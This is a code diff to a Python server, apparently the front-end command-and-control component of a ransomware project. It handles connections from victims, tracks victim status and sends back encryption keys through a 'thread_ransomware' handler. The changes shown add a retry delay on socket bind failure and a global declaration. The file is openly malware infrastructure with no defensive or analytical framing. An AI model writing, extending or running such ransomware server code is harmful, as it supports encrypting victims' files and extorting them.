@@ -1,4 +1,6 @@
 import threading
+import time
+
 import utile.security as security
 import queue
 import socket
@@ -11,13 +13,15 @@ from utile.network import recv_msg, send_msg, recv_msg_clear, send_msg_clear
 status_victims = {}
 lock = threading.Lock()
 
+
 class serveur_frontal(object):
 
-    def __init__(self, ip, port):
+    def __init__(self, ip, port, retry=60):
         """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
         """
         self.ip = ip
         self.port = port
+        self.retry = retry
 
     def start_server(self):
         global config_serveur
@@ -40,6 +44,7 @@ class serveur_frontal(object):
             s.bind((self.ip, self.port))
         except socket.error as error:
             print(str(error))
+            time.sleep(self.retry)
         s.listen(10)
         print(f'$-F: Server started ! Waiting for clients...')
         while True:
@@ -69,10 +74,10 @@ class serveur_frontal(object):
                 if "INITIALIZE_KEY" in rsp:
                     queue_response.put(rsp)
 
-
     def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
         global config_serveur
         global config_workstation
+        global status_victims
         while True:
             msg = recv_msg_clear(c_v)
             if "INITIALIZE_REQ" in msg:
@@ -99,3 +104,4 @@ class serveur_frontal(object):
                     key_rsp['KEY']
                 ])
                 send_msg_clear(c_v, msg)
+
